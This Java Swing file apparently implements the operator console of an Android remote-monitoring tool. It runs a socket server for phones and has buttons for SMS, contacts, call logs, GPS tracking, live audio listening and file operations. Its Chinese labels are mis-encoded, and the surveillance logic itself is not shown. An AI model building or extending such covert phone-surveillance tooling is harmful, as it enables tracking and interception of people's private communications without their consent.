package com.saiteng.main;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Frame;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.IOException;

import javax.swing.DefaultCellEditor;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.ScrollPaneConstants;
import javax.swing.SwingConstants;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableColumn;
import javax.swing.table.TableModel;

import com.saiteng.Frame.PhoneInfoFrame;
import com.saiteng.connect.server.AndroidConnectClient;
import com.saiteng.connect.server.AndroidConnectServer;

public class ConnectServerFrame extends JFrame implements ActionListener{
	private static final long serialVersionUID = 1L;
	
	private JButton openButton;
	
	private JButton fileoperate;
	
	private JButton listenButton;
	
	private JButton infoButton;
	
	private JButton messageButton;
	
	private JButton contactButton;
	
	private JButton phoneButton;
	
	private JButton GPSButton;
	private JPanel panel;
	
	private JTextArea textArea;
	
	private JTable table;
	
	private JCheckBox ckb = null;  
	
	private Object[][] arr = new Object[20][4];//�������
	
	private Object[] name = new Object[] {"����ʱ��", "ip��ַ","��������","�ֻ�����" };
	
	private Process ps;
	
	public ConnectServerFrame(){
		
		super("����׿��ء�");

		int width = 500, height = 400;
		
		this.setSize(width, height);
		
		panel = new JPanel();
		
		add(panel, BorderLayout.NORTH);
		
		table = new JTable(model);
		
		table.setRowHeight(25);
		
		table.getColumnModel().getColumn(0).setPreferredWidth(5);;
		
		DefaultTableCellRenderer   r   =   new   DefaultTableCellRenderer();   
		
		r.setHorizontalAlignment(JLabel.CENTER);   
		
		table.setDefaultRenderer(Object.class,   r);
		
        add(table);
        
		openButton = new JButton("����������");
		
		openButton.addActionListener(this);
		
		panel.add(openButton);
		
		infoButton = new JButton("�ֻ���Ϣ");
		
		infoButton.addActionListener(this);
		
		panel.add(infoButton);
		
		messageButton = new JButton("���ż��");
		
		messageButton.addActionListener(this);
		
		panel.add(messageButton);
		
		contactButton = new JButton("ͨѶ¼");
		
		contactButton.addActionListener(this);
		
		panel.add(contactButton);
		
		phoneButton = new JButton("ͨ����¼");
		
		phoneButton.addActionListener(this);
		
		panel.add(phoneButton);
		
		GPSButton = new JButton("GPS��λ");
		
		GPSButton.addActionListener(this);
		
		panel.add(GPSButton);
		
		listenButton = new JButton("�������");
		
		listenButton.setEnabled(false);
		
		listenButton.addActionListener(this);
		
		panel.add(listenButton);

		fileoperate = new JButton("�ļ�����");
		
		fileoperate.addActionListener(this);
		
		panel.add(fileoperate);

		JScrollPane scrollPane = new JScrollPane(table,
				
				ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS,
				
				ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
		
		add(scrollPane, BorderLayout.CENTER);

		Toolkit tk = this.getToolkit();
		
		Dimension ds = tk.getScreenSize();
		
		this.setLocation((ds.width - width) / 2, (ds.height - height) / 2);
		
		this.setVisible(true);
		//�������ڹر�
		this.addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent e) {
				//�����ӵĿͻ��˷��ͷ������رյ���Ϣ
				if(connectServer!=null){
					
					connectServer.Boardcast("server_close");
				}
			}
		});
		//����ѡ�е��е��ֻ�����
		table.addMouseListener(new MouseAdapter() {
			
			@Override
			public void mouseClicked(MouseEvent e) {
				super.mouseClicked(e);
				System.out.println("ѡ�е��ǣ�"+table.getValueAt(table.getSelectedRow(), 3)+"");
			}
			
		});
	}
	
	
	
	public void updateModel(){
		
		Object[][] arr_=DataModel.getDataModel().getArr();
		
		if(arr_==null){
			
			arr_=arr;
		}
		
		if(table!=null){
			
			 DefaultTableModel  model1 = new DefaultTableModel(//
						
					 arr_,
					 name // ��ͷ
					   
					);

			table.setModel(model1);
			
			model1.fireTableStructureChanged();// JTableˢ�½ṹ
			
			model1.fireTableDataChanged();// ˢ��JTable����
		}
		
	}
	
	private TableModel  model = new DefaultTableModel(//
			
			   arr,// ����//   arr,// ����
			   
			   name // ��ͷ
			   
			);
	
	
	

	@Override
	public void actionPerformed(ActionEvent event) {
		
		Object obj = event.getSource();
		
		if (obj == openButton) {
			
			openButton.setEnabled(false);
			
			openButton.setText("�����ѿ���");
			
			start();
			
			listenButton.setEnabled(true);
			
		}else if(obj==infoButton){
			//�����ֻ���Ϣ����
			PhoneInfoFrame infoFrame = new PhoneInfoFrame();
			
			
			Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
			
			infoFrame.setBounds((screenSize.width) / 6, (screenSize.height) / 6, 800, 500);
			
			infoFrame.setVisible(true);
			
			
		} else if (obj == fileoperate) {
			
			dooperate();
			
		}else if(obj ==listenButton){
			
			listenButton.setEnabled(true);
			
			if("�������".equals(listenButton.getText())){
				
				listenButton.setText("�رռ���");
				
				startVlc();
				
			}else{
				
				listenButton.setText("�������");
				
				stopVlc();
			}	
		}
	}
	


	
	//����vlc����������android�˷��͵���Ƶ������
	private void startVlc(){
		
		String cmd= "C:/Program Files/VLC/vlc.exe";
		
		try {
			
			ps = Runtime.getRuntime().exec(cmd);
			
		} catch (IOException e) {
			
			e.printStackTrace();
		}
	}
	private void stopVlc(){
		
		ps.destroy();
		
	}
	//socket��������
	private AndroidConnectServer connectServer;
	
	private void start() {
		
		connectServer = new AndroidConnectServer(20086,this);
		
		connectServer.start();
		
	}
	
	private void dooperate() {
		
	}

}
